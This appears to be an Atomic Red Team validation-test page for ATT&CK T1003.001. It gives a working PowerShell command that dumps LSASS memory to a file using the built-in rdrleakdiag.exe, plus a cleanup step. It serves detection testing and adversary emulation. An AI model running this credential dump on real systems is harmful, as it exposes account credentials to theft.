---
atomic_guid: "47a539d1-61b9-4364-bf49-a68bc2a95ef0"
title: "Dump LSASS.exe using lolbin rdrleakdiag.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "47a539d1-61b9-4364-bf49-a68bc2a95ef0"
  - "Dump LSASS.exe using lolbin rdrleakdiag.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

The memory of lsass.exe is often dumped for offline credential theft attacks. 
This can be achieved with lolbin rdrleakdiag.exe. 

Upon successful execution, you should see the following files created, $env:TEMP\minidump_<PID>.dmp and  $env:TEMP\results_<PID>.hlk.

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003001-lsass-memory|T1003.001: LSASS Memory]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
if (Test-Path -Path "$env:SystemRoot\System32\rdrleakdiag.exe") {
      $binary_path = "$env:SystemRoot\System32\rdrleakdiag.exe"
  } elseif (Test-Path -Path "$env:SystemRoot\SysWOW64\rdrleakdiag.exe") {
      $binary_path = "$env:SystemRoot\SysWOW64\rdrleakdiag.exe"
  } else {
      $binary_path = "File not found"
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path"$env:TEMP\t1003.001-13-rdrleakdiag")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host "Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory."
```

### Cleanup

```powershell
Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
